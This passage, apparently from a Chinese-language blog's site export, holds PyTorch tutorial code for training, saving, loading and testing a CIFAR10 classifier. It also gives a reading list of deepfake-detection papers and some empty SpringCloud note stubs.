计算损失</span></span><br><span class="line">    result_loss = loss(output, targets)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反向传播</span></span><br><span class="line">    result_loss.backward()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> Linear, Conv2d, MaxPool2d, Flatten, Sequential, CrossEntropyLoss</span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> SGD</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义数据集的转换操作</span></span><br><span class="line">dataset_transform = torchvision.transforms.Compose([</span><br><span class="line">    torchvision.transforms.ToTensor()</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载测试数据集</span></span><br><span class="line">test_set = torchvision.datasets.CIFAR10(root=<span class="string">&#x27;./dataset&#x27;</span>, train=<span class="literal">False</span>, download=<span class="literal">True</span>,</span><br><span class="line">                                        transform=dataset_transform)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试数据加载器</span></span><br><span class="line">test_loader = DataLoader(dataset=test_set, batch_size=<span class="number">64</span>, shuffle=<span class="literal">False</span>, num_workers=<span class="number">0</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义自定义模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Module</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Module, self).__init__()</span><br><span class="line">        self.model1 = Sequential(</span><br><span class="line">            Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>, padding=<span class="number">2</span>),</span><br><span class="line">            MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            Conv2d(<span class="number">32</span>, <span class="number">32</span>, <span class="number">5</span>, padding=<span class="number">2</span>),</span><br><span class="line">            MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            Conv2d(<span class="number">32</span>, <span class="number">64</span>, <span class="number">5</span>, padding=<span class="number">2</span>),</span><br><span class="line">            MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            Flatten(),</span><br><span class="line">            Linear(<span class="number">1024</span>, <span class="number">64</span>),</span><br><span class="line">            Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">return</span> self.model1(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建交叉熵损失函数对象</span></span><br><span class="line">loss = CrossEntropyLoss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建模型对象</span></span><br><span class="line">module = Module()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建优化器对象</span></span><br><span class="line">optim = SGD(module.parameters(), lr=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行训练循环</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    running_loss = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> test_loader:</span><br><span class="line">        imgs, targets = data</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 前向传播计算输出</span></span><br><span class="line">        output = module(imgs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算损失</span></span><br><span class="line">        result_loss = loss(output, targets)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 梯度清零</span></span><br><span class="line">        optim.zero_grad()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 反向传播</span></span><br><span class="line">        result_loss.backward()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新模型参数</span></span><br><span class="line">        optim.step()</span><br><span class="line"></span><br><span class="line">        running_loss += result_loss</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次循环, loss = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(epoch, running_loss))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="预训练"><a href="#预训练" class="headerlink" title="预训练"></a>预训练</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch.nn <span class="keyword">import</span> Linear</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用预训练的VGG16模型（pretrained=True）</span></span><br><span class="line">vgg16_true = torchvision.models.vgg16(pretrained=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(vgg16_true)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用随机初始化的VGG16模型（pretrained=False）</span></span><br><span class="line">vgg16_false = torchvision.models.vgg16(pretrained=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(vgg16_false)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改pretrained=True的VGG16模型的分类器层，并添加一个新的线性层</span></span><br><span class="line">vgg16_true.classifier.add_module(<span class="string">&#x27;add_linear&#x27;</span>, Linear(<span class="number">1000</span>, <span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(vgg16_true)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改pretrained=False的VGG16模型的分类器层的最后一个线性层</span></span><br><span class="line">vgg16_false.classifier[<span class="number">6</span>] = Linear(<span class="number">4096</span>, <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(vgg16_false)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="模型保存"><a href="#模型保存" class="headerlink" title="模型保存"></a>模型保存</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从torchvision中获取预训练的VGG16模型（pretrained=False）</span></span><br><span class="line">vgg16 = torchvision.models.vgg16(pretrained=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一：保存整个模型</span></span><br><span class="line">torch.save(vgg16, <span class="string">&quot;vgg16_method1.pth&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二：保存模型的状态字典</span></span><br><span class="line">torch.save(vgg16.state_dict(), <span class="string">&quot;vgg16_method2.pth&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 陷阱</span></span><br><span class="line"><span class="comment"># 方法一中保存模型时，在加载模型时，如果是自定义模型还是，给出模型的结构</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="模型加载"><a href="#模型加载" class="headerlink" title="模型加载"></a>模型加载</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法一：加载整个模型</span></span><br><span class="line">vgg16_1 = torch.load(<span class="string">&quot;vgg16_method1.pth&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(vgg16_1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法二：加载模型的状态字典并应用到新创建的模型对象上</span></span><br><span class="line">vgg16_2 = torchvision.models.vgg16(pretrained=<span class="literal">False</span>)</span><br><span class="line">vgg16_2.load_state_dict(torch.load(<span class="string">&quot;vgg16_method2.pth&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(vgg16_2)</span><br></pre></td></tr></table></figure>



<h2 id="用gpu训练模型"><a href="#用gpu训练模型" class="headerlink" title="用gpu训练模型"></a>用gpu训练模型</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 作者：小土堆</span></span><br><span class="line"><span class="comment"># 公众号：土堆碎念</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> torch.utils.tensorboard <span class="keyword">import</span> SummaryWriter</span><br><span class="line"></span><br><span class="line"><span class="comment"># from model import *</span></span><br><span class="line"><span class="comment"># 准备数据集</span></span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义训练的设备</span></span><br><span class="line">device = torch.device(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line">train_data = torchvision.datasets.CIFAR10(root=<span class="string">&quot;../data&quot;</span>, train=<span class="literal">True</span>, transform=torchvision.transforms.ToTensor(),</span><br><span class="line">                                          download=<span class="literal">True</span>)</span><br><span class="line">test_data = torchvision.datasets.CIFAR10(root=<span class="string">&quot;../data&quot;</span>, train=<span class="literal">False</span>, transform=torchvision.transforms.ToTensor(),</span><br><span class="line">                                         download=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># length 长度</span></span><br><span class="line">train_data_size = <span class="built_in">len</span>(train_data)</span><br><span class="line">test_data_size = <span class="built_in">len</span>(test_data)</span><br><span class="line"><span class="comment"># 如果train_data_size=10, 训练数据集的长度为：10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;训练数据集的长度为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(train_data_size))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;测试数据集的长度为：&#123;&#125;&quot;</span>.<span class="built_in">format</span>(test_data_size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 DataLoader 来加载数据集</span></span><br><span class="line">train_dataloader = DataLoader(train_data, batch_size=<span class="number">64</span>)</span><br><span class="line">test_dataloader = DataLoader(test_data, batch_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建网络模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tudui</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Tudui, self).__init__()</span><br><span class="line">        self.model = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">32</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Flatten(),</span><br><span class="line">            nn.Linear(<span class="number">64</span>*<span class="number">4</span>*<span class="number">4</span>, <span class="number">64</span>),</span><br><span class="line">            nn.Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.model(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">tudui = Tudui()</span><br><span class="line">tudui = tudui.to(device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 损失函数</span></span><br><span class="line">loss_fn = nn.CrossEntropyLoss()</span><br><span class="line">loss_fn = loss_fn.to(device)</span><br><span class="line"><span class="comment"># 优化器</span></span><br><span class="line"><span class="comment"># learning_rate = 0.01</span></span><br><span class="line"><span class="comment"># 1e-2=1 x (10)^(-2) = 1 /100 = 0.01</span></span><br><span class="line">learning_rate = <span class="number">1e-2</span></span><br><span class="line">optimizer = torch.optim.SGD(tudui.parameters(), lr=learning_rate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置训练网络的一些参数</span></span><br><span class="line"><span class="comment"># 记录训练的次数</span></span><br><span class="line">total_train_step = <span class="number">0</span></span><br><span class="line"><span class="comment"># 记录测试的次数</span></span><br><span class="line">total_test_step = <span class="number">0</span></span><br><span class="line"><span class="comment"># 训练的轮数</span></span><br><span class="line">epoch = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加tensorboard</span></span><br><span class="line">writer = SummaryWriter(<span class="string">&quot;../logs_train&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------第 &#123;&#125; 轮训练开始-------&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练步骤开始</span></span><br><span class="line">    tudui.train()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> train_dataloader:</span><br><span class="line">        imgs, targets = data</span><br><span class="line">        imgs = imgs.to(device)</span><br><span class="line">        targets = targets.to(device)</span><br><span class="line">        outputs = tudui(imgs)</span><br><span class="line">        loss = loss_fn(outputs, targets)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 优化器优化模型</span></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line"></span><br><span class="line">        total_train_step = total_train_step + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> total_train_step % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;训练次数：&#123;&#125;, Loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(total_train_step, loss.item()))</span><br><span class="line">            writer.add_scalar(<span class="string">&quot;train_loss&quot;</span>, loss.item(), total_train_step)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试步骤开始</span></span><br><span class="line">    tudui.<span class="built_in">eval</span>()</span><br><span class="line">    total_test_loss = <span class="number">0</span></span><br><span class="line">    total_accuracy = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> test_dataloader:</span><br><span class="line">            imgs, targets = data</span><br><span class="line">            imgs = imgs.to(device)</span><br><span class="line">            targets = targets.to(device)</span><br><span class="line">            outputs = tudui(imgs)</span><br><span class="line">            loss = loss_fn(outputs, targets)</span><br><span class="line">            total_test_loss = total_test_loss + loss.item()</span><br><span class="line">            accuracy = (outputs.argmax(<span class="number">1</span>) == targets).<span class="built_in">sum</span>()</span><br><span class="line">            total_accuracy = total_accuracy + accuracy</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;整体测试集上的Loss: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(total_test_loss))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;整体测试集上的正确率: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(total_accuracy/test_data_size))</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;test_loss&quot;</span>, total_test_loss, total_test_step)</span><br><span class="line">    writer.add_scalar(<span class="string">&quot;test_accuracy&quot;</span>, total_accuracy/test_data_size, total_test_step)</span><br><span class="line">    total_test_step = total_test_step + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    torch.save(tudui, <span class="string">&quot;tudui_&#123;&#125;.pth&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;模型已保存&quot;</span>)</span><br><span class="line"></span><br><span class="line">writer.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以采用这种方式来提高代码的复用性：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果有可用的 GPU，将损失函数移动到 GPU 上</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    loss_fn = loss_fn.cuda()</span><br></pre></td></tr></table></figure>



<h2 id="测试训练的模型"><a href="#测试训练的模型" class="headerlink" title="测试训练的模型"></a>测试训练的模型</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># 作者：小土堆</span></span><br><span class="line"><span class="comment"># 公众号：土堆碎念</span></span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义图像路径</span></span><br><span class="line">image_path = <span class="string">&quot;imgs/dog_1.png&quot;</span></span><br><span class="line"><span class="comment"># 使用PIL库打开图像</span></span><br><span class="line">image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line"><span class="built_in">print</span>(image)</span><br><span class="line"><span class="comment"># 将图像转换为RGB模式</span></span><br><span class="line">image = image.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line"><span class="comment"># 定义图像转换操作，包括将图像大小调整为32x32，并将其转换为张量</span></span><br><span class="line">transform = torchvision.transforms.Compose([torchvision.transforms.Resize((<span class="number">32</span>, <span class="number">32</span>)),</span><br><span class="line">                                            torchvision.transforms.ToTensor()])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载CIFAR10测试数据集</span></span><br><span class="line">test_data = torchvision.datasets.CIFAR10(root=<span class="string">&quot;dataset&quot;</span>, train=<span class="literal">False</span>, transform=torchvision.transforms.ToTensor(),</span><br><span class="line">                                         download=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对图像应用转换操作</span></span><br><span class="line">image = transform(image)</span><br><span class="line"><span class="built_in">print</span>(image.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建网络模型</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tudui</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Tudui, self).__init__()</span><br><span class="line">        self.model = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">32</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">            nn.Flatten(),</span><br><span class="line">            nn.Linear(<span class="number">64</span>*<span class="number">4</span>*<span class="number">4</span>, <span class="number">64</span>),</span><br><span class="line">            nn.Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.model(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载已训练的模型</span></span><br><span class="line">model = torch.load(<span class="string">&quot;model/tudui_19.pth&quot;</span>, map_location=torch.device(<span class="string">&#x27;cpu&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(model)</span><br><span class="line"><span class="comment"># 将图像形状调整为(1, 3, 32, 32)的张量</span></span><br><span class="line">image = torch.reshape(image, (<span class="number">1</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">32</span>))</span><br><span class="line"><span class="comment"># 将模型设置为评估模式</span></span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="comment"># 在不进行梯度计算的情况下进行前向传播</span></span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    output = model(image)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取输出中的最大值索引</span></span><br><span class="line"><span class="built_in">print</span>(output.argmax(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 打印CIFAR10数据集的类别列表</span></span><br><span class="line"><span class="built_in">print</span>(test_data.classes)</span><br><span class="line"><span class="comment"># 根据最大值索引获取预测结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;预测的结果是<span class="subst">&#123;test_data.classes[output.argmax(<span class="number">1</span>)]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>Pytorch</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机视觉文献</title>
    <url>/2023/07/06/%E7%A7%91%E7%A0%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E6%96%87%E7%8C%AE/</url>
    <content><![CDATA[<h1 id="计算机视觉文献"><a href="#计算机视觉文献" class="headerlink" title="计算机视觉文献"></a>计算机视觉文献</h1><table>
<thead>
<tr>
<th>论文名称</th>
<th>论文地址</th>
</tr>
</thead>
<tbody><tr>
<td>Self-supervised Learning of Adversarial Example- Towards Good Generalizations for Deepfake Detection, CVPR 2022</td>
<td><a href="https://arxiv.org/abs/2203.12208">https://arxiv.org/abs/2203.12208</a></td>
</tr>
<tr>
<td>Protecting Celebrities from DeepFake with Identity Consistency Transformer, CVPR 2022</td>
<td><a href="https://arxiv.org/abs/2203.01318">https://arxiv.org/abs/2203.01318</a></td>
</tr>
<tr>
<td>Learning Second Order Local Anomaly for General Face Forgery Detection, CVPR 2022</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2022/papers/Fei_Learning_Second_Order_Local_Anomaly_for_General_Face_Forgery_Detection_CVPR_2022_paper.pdf">https://openaccess.thecvf.com/content/CVPR2022/papers/Fei_Learning_Second_Order_Local_Anomaly_for_General_Face_Forgery_Detection_CVPR_2022_paper.pdf</a></td>
</tr>
<tr>
<td>Implicit Identity Leakage- The Stumbling Block to Improving Deepfake Detection Generalization ,CVPR2023</td>
<td><a href="https://arxiv.org/pdf/2210.14457.pdf">https://arxiv.org/pdf/2210.14457.pdf</a></td>
</tr>
<tr>
<td>Hierarchical Fine-Grained Image Forgery Detection and Localization-CVPR2023</td>
<td><a href="https://arxiv.org/abs/2303.17111">https://arxiv.org/abs/2303.17111</a></td>
</tr>
<tr>
<td>End-to-End Reconstruction-Classification Learning for Face Forgery Detection, CVPR 2022</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2022/papers/Cao_End-to-End_Reconstruction-Classification_Learning_for_Face_Forgery_Detection_CVPR_2022_paper.pdf">https://openaccess.thecvf.com/content/CVPR2022/papers/Cao_End-to-End_Reconstruction-Classification_Learning_for_Face_Forgery_Detection_CVPR_2022_paper.pdf</a></td>
</tr>
<tr>
<td>DeepFake Disrupter- The Detector of DeepFake Is My Friend, CVPR 2022</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2022/html/Wang_DeepFake_Disrupter_The_Detector_of_DeepFake_Is_My_Friend_CVPR_2022_paper.html">https://openaccess.thecvf.com/content/CVPR2022/html/Wang_DeepFake_Disrupter_The_Detector_of_DeepFake_Is_My_Friend_CVPR_2022_paper.html</a></td>
</tr>
<tr>
<td>Exploring Frequency Adversarial Attacks for Face Forgery Detection-CVPR2022</td>
<td><a href="https://arxiv.org/abs/2203.15674">https://arxiv.org/abs/2203.15674</a></td>
</tr>
<tr>
<td>Detecting Deepfakes with Self-Blended Images-CVPR2022</td>
<td><a href="https://arxiv.org/abs/2204.08376">https://arxiv.org/abs/2204.08376</a></td>
</tr>
<tr>
<td>Confidence-Calibrated_Face_Image_Forgery_Detection_with_Contrastive_Representation_Distillation ACCV_2022</td>
<td><a href="https://openaccess.thecvf.com/content/ACCV2022/papers/Yang_Confidence-Calibrated_Face_Image_Forgery_Detection_with_Contrastive_Representation_Distillation_ACCV_2022_paper.pdf">https://openaccess.thecvf.com/content/ACCV2022/papers/Yang_Confidence-Calibrated_Face_Image_Forgery_Detection_with_Contrastive_Representation_Distillation_ACCV_2022_paper.pdf</a></td>
</tr>
<tr>
<td>ADD Frequency Attention and Multi-View Based Knowledge Distillation to AAAI2022</td>
<td><a href="https://arxiv.org/abs/2112.03553">https://arxiv.org/abs/2112.03553</a></td>
</tr>
<tr>
<td>Voice-Face Homogeneity Tells Deepfake-CVPR2022</td>
<td><a href="https://arxiv.org/abs/2203.02195">https://arxiv.org/abs/2203.02195</a></td>
</tr>
<tr>
<td>Self-supervised Learning of Adversarial Example-CVPR2022</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2022/papers/Chen_Self-Supervised_Learning_of_Adversarial_Example_Towards_Good_Generalizations_for_Deepfake_CVPR_2022_paper.pdf">https://openaccess.thecvf.com/content/CVPR2022/papers/Chen_Self-Supervised_Learning_of_Adversarial_Example_Towards_Good_Generalizations_for_Deepfake_CVPR_2022_paper.pdf</a></td>
</tr>
<tr>
<td>Domain Generalization via Shuffled Style Assembly for Face Anti-Spoofing-CVPR2022</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2022/papers/Wang_Domain_Generalization_via_Shuffled_Style_Assembly_for_Face_Anti-Spoofing_CVPR_2022_paper.pdf">https://openaccess.thecvf.com/content/CVPR2022/papers/Wang_Domain_Generalization_via_Shuffled_Style_Assembly_for_Face_Anti-Spoofing_CVPR_2022_paper.pdf</a></td>
</tr>
<tr>
<td>MagDR Mask-guided Detection and Reconstruction for Defending Deepfakes CVPR2021</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2021/papers/Chen_MagDR_Mask-Guided_Detection_and_Reconstruction_for_Defending_Deepfakes_CVPR_2021_paper.pdf">https://openaccess.thecvf.com/content/CVPR2021/papers/Chen_MagDR_Mask-Guided_Detection_and_Reconstruction_for_Defending_Deepfakes_CVPR_2021_paper.pdf</a></td>
</tr>
<tr>
<td>Frequency-aware Discriminative Feature Learning Supervised by Single-Center CVPR2021</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2021/papers/Li_Frequency-Aware_Discriminative_Feature_Learning_Supervised_by_Single-Center_Loss_for_Face_CVPR_2021_paper.pdf">https://openaccess.thecvf.com/content/CVPR2021/papers/Li_Frequency-Aware_Discriminative_Feature_Learning_Supervised_by_Single-Center_Loss_for_Face_CVPR_2021_paper.pdf</a></td>
</tr>
<tr>
<td>Protecting Celebrities from DeepFake with Identity Consistency Transformer CVPR2022</td>
<td><a href="https://openaccess.thecvf.com/content/CVPR2022/supplemental/Dong_Protecting_Celebrities_From_CVPR_2022_supplemental.pdf">https://openaccess.thecvf.com/content/CVPR2022/supplemental/Dong_Protecting_Celebrities_From_CVPR_2022_supplemental.pdf</a></td>
</tr>
<tr>
<td>improving the Efficiency and Robustness of Deepfakes Detection through CVPR2021</td>
<td><a href="https://arxiv.org/abs/2104.04480">https://arxiv.org/abs/2104.04480</a></td>
</tr>
<tr>
<td>Exploring Temporal Coherence for More General Video Face Forgery Detection ICCV2021</td>
<td><a href="https://openaccess.thecvf.com/content/ICCV2021/papers/Zheng_Exploring_Temporal_Coherence_for_More_General_Video_Face_Forgery_Detection_ICCV_2021_paper.pdf">https://openaccess.thecvf.com/content/ICCV2021/papers/Zheng_Exploring_Temporal_Coherence_for_More_General_Video_Face_Forgery_Detection_ICCV_2021_paper.pdf</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/03/%E7%BC%96%E7%A8%8B/SpringCloud%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="SpringCloud项目"><a href="#SpringCloud项目" class="headerlink" title="SpringCloud项目"></a>SpringCloud项目</h1><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/07/03/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/SpringCloud%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h1 id="SpringCloud项目"><a href="#SpringCloud项目" class="headerlink" title="SpringCloud项目"></a>SpringCloud项目</h1><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
  </entry>
  <entry>
    <title>Nacos学习笔记</title>
    <url>/2023/07/03/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/Nacos%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
